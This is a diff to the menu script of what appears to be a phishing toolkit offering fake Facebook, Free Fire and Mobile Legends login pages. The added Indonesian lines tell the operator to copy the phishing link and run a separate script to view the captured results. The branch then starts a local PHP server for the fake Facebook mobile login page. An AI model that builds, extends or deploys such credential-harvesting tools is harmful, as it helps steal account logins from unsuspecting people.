@@ -26,7 +26,7 @@ echo $pur"[" $ku"?" $pur"]" $ku" open new session"
 echo $pur"[" $ku"?" $pur"]" $ku" run Next.sh"
 echo $pur"____________________________________"
 echo $pur"["$ku"1"$pur"]"$ku" INSTALL ALL MODULES NEEDED"
-echo $pur"["$ku"2"$pur"]"$ku" FACEBOOK SECURE"
+echo $pur"["$ku"2"$pur"]"$ku" FACEBOOK SECURITY"
 echo $pur"["$ku"3"$pur"]"$ku" FACEBOOK LOGIN"
 echo $pur"["$ku"4"$pur"]"$ku" FREEFIRE"
 echo $pur"["$ku"5"$pur"]"$ku" MOBILE LEGENDS"
@@ -71,8 +71,11 @@ then
 echo $i"Openning..."
 sleep 1
 echo $pur"now open new session and run Next.sh"
-echo $ku"_________________________________"
+echo $ku"____________________________________________________________________"
 echo $pur"  PHISING FACEBOOK MOBILE LOGIN"
+echo $pur"  SALIN LINK YANG ADA DI TANDA ()"
+echo $pur"  JIKA INGIN MELIHAT HASIL BUKA SESSION BARU DAN KETIK sh Hasil.sh"
+echo $ku"____________________________________________________________________"
 php -S localhost:8080 v2.php
 fi
 
